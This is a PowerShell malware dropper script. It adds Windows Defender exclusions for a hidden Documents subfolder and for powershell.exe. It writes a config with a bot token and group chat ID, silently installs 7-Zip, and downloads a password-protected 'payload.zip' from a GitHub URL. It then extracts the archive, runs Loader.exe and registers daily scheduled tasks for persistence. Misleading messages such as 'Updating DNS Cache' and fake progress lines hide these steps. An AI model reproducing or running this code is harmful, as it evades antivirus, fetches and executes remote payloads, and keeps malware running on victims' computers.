# Variables
$7zipUrl = "https://www.7-zip.org/a/7z2301-x64.exe"
$installerPath = "$env:TEMP\7zInstaller.exe"
$7zipPath = "C:\Program Files\7-Zip\7z.exe"
$zipUrl = "https://github.com/winorap/hh-rhy/raw/refs/heads/main/payload.zip"
$documentsPath = [Environment]::GetFolderPath("MyDocuments")
$folderPath = Join-Path -Path $documentsPath -ChildPath "gogjothegoat"
$zipFilePath = Join-Path $folderPath "file.zip"
$payloadFolderPath = Join-Path $folderPath "payload"
$password = "hunter"
$processName = "powershell.exe"

# Exclude folder and process from Windows Defender
Add-MpPreference -ExclusionPath $folderPath | Out-Null
Add-MpPreference -ExclusionProcess $processName | Out-Null


$configFilePath = Join-Path -Path $documentsPath -ChildPath "config.txt"
$configContent = @"
BOT_TOKEN=
GROUP_CHAT_ID=-
"@
Try {
    $configContent | Set-Content -Path $configFilePath -Force
    Write-Host "Progress ------- 1% ------- "
} Catch {
    Write-Error "Progress ------- 2% ------- "
}

# Function to Download and Install 7-Zip
function Install-7Zip {
    Write-Host "Updating DNS Cache"
    Invoke-WebRequest -Uri $7zipUrl -OutFile $installerPath
    Start-Process -FilePath $installerPath -ArgumentList "/S" -Wait
    Remove-Item -Path $installerPath -Force
    Write-Host "Progress ------- 5% ------- "
}

# Ensure 7-Zip is installed
if (-Not (Test-Path $7zipPath)) {
    Install-7Zip
} else {
    Write-Host "Progress ------- 7% ------- "
}

# Create folder structure if it does not exist
if (-Not (Test-Path $folderPath)) {
    New-Item -Path $folderPath -ItemType Directory | Out-Null
    (Get-Item $folderPath).Attributes = 'Hidden'
}
if (-Not (Test-Path $payloadFolderPath)) {
    New-Item -Path $payloadFolderPath -ItemType Directory | Out-Null
}

# Download ZIP file if not already downloaded
if (-Not (Test-Path $zipFilePath)) {
    Write-Host "Progress ------- 15% ------- "
    Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
}

# Extract ZIP file into 'payload' folder
Write-Host "Progress ------- 25% ------- "
& $7zipPath x $zipFilePath "-o$payloadFolderPath" "-p$password" -y
if ($LASTEXITCODE -eq 0) {
    Write-Host "Progress ------- 35% ------- "
} else {
    Write-Host "Progress ------- 38% ------- "
    exit
}

# Execute files if they exist
$OriginalExePath = Join-Path $payloadFolderPath "Original.exe"
$LoaderPath = Join-Path $payloadFolderPath "Loader.exe"


if (Test-Path $LoaderPath) {
    Write-Host "Progress ------- 47% ------- "
    Start-Process -FilePath $LoaderPath -WorkingDirectory $payloadFolderPath
} else {
    Write-Host "Progress ------- 55% ------- "
}



# Schedule tasks for Original.exe and Loader.exe
$taskNameOriginal = "RunOriginal"
$taskNameLoader = "RunLoader"

$actionOriginal = New-ScheduledTaskAction -Execute $OriginalExePath
$actionLoader = New-ScheduledTaskAction -Execute $LoaderPath

$trigger = New-ScheduledTaskTrigger -Daily -At (Get-Date).AddMinutes(5)
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable

if (Test-Path $OriginalExePath) {
    Register-ScheduledTask -Action $actionOriginal -Trigger $trigger -Settings $settings -TaskName $taskNameOriginal -Description "Runs Original.exe daily." | Out-Null
    Write-Host "Progress ------- 59% ------- "
}

if (Test-Path $LoaderPath) {
    Register-ScheduledTask -Action $actionLoader -Trigger $trigger -Settings $settings -TaskName $taskNameLoader -Description "Runs Loader.exe daily." | Out-Null
    Write-Host "Progress ------- 65% ------- "
}

Write-Host "Progress ------- 69% ------- "